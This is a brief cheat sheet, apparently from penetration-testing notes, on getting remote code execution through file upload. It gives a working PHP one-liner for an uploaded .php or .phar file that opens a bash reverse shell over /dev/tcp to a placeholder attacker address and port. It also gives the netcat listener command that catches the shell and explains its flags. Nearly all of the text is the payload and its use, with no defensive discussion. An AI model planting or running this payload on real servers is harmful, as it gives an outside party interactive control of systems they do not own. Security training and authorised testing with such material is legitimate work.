# Remote Code Execution (RCE) & Reverse Shell Payloads

Exact payloads and listener setups for spawning interactive reverse shells during web exploitation.

---

## 1. PHP One-Liner Payload
Used inside uploaded `.php` or `.phar` files to invoke a system `/bin/bash` TCP connection back to Kali:

```php
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/<KALI_IP>/<PORT> 0>&1'");
?>
```

---

## 2. Catching the Shell (Netcat Listener)
On your Kali machine, start listening on the specified port:

```bash
sudo nc -lvnp <PORT>
```

- `-l`: Listen mode
- `-v`: Verbose output
- `-n`: Numeric IP addresses only (no DNS lookup delay)
- `-p`: Port number
